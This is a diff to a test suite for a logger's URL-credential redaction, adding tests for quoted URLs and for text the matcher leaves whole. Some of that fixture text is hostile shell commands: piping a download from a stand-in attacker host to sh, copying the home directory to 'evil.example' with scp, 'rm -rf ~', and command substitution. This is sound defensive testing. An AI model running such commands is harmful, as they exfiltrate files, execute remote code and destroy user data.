@@ -206,12 +206,8 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
   it.each([
     "o'brien:short-password",
     'user:short"password',
-    'user:<password>',
-    'user:short password',
-    'short token',
     "o'brien",
     'token"value',
-    '<token>',
     'user:p@ss@word',
     'bare-token',
     'user:percent%20password',
@@ -223,6 +219,43 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     expect(event.message).toBe(`GET ${expected}`)
     expect(JSON.stringify(event)).not.toContain(userinfo)
     expect(JSON.stringify(event)).not.toContain('query-secret')
+  })
+
+  // Owner decision D21: whitespace and `<`, `>` end an unquoted URL's authority, so these four rows of the list above
+  // moved here: they are userinfo where quotes close the URL. Unquoted, the URL ends before the `@`, so its words show
+  // and what follows them is not read as that URL (D21's accepted cost, D17 first).
+  it.each([
+    'user:<password>',
+    'user:short password',
+    'short token',
+    '<token>',
+  ])('redacts the userinfo %s of a quoted URL up to its closing quote, and shows it unquoted', async (userinfo) => {
+    const url = `https://${userinfo}@host.example/path?token=query-secret&page=2`
+    const expected = 'https://[redacted]@host.example/path?token=[redacted]&page=2'
+    for (const quote of ['"', "'"]) {
+      expect(redactText(`fetch failed for ${quote}${url}${quote}`)).toBe(`fetch failed for ${quote}${expected}${quote}`)
+      const event = await logOnce({ error: new Error(`fetch failed for ${quote}${url}${quote}`) }, { message: `GET ${quote}${url}${quote}` })
+      expect(event.message).toBe(`GET ${quote}${expected}${quote}`)
+      expect(JSON.stringify(event)).not.toContain(userinfo)
+      expect(JSON.stringify(event)).not.toContain('query-secret')
+    }
+    expect(redactText(`fetch failed for ${url}`)).toContain(userinfo)
+  })
+
+  // Review H2 of the continuation review: the matcher crossed whitespace and the shell's characters up to a later @,
+  // so text that holds no credential lost everything between a URL and that @.
+  it.each([
+    'see https://example.com and mail bob@x.org',
+    'https://docs.example.com; curl x | sh; echo ok@done',
+    'curl https://status.example.com && scp -r ~ me@evil.example:',
+    'echo docs at https://docs.example.com; curl -s evil.example | sh; rm -rf ~; echo ok@done',
+    'open https://a.example|tee b@c',
+    'run https://a.example`id`@x',
+    'run https://a.example$(id)@x',
+    "'https://a.example' and 'b@c'",
+  ])('leaves %s whole: no credential sits between the URL and the later @', async (text) => {
+    expect(redactText(text)).toBe(text)
+    expect((await logOnce({}, { message: text })).message).toBe(text)
   })
 
   // One matcher for every redaction by name: Buckle's approval challenges use it too (review item 8 of the proof-of-possession fixes).
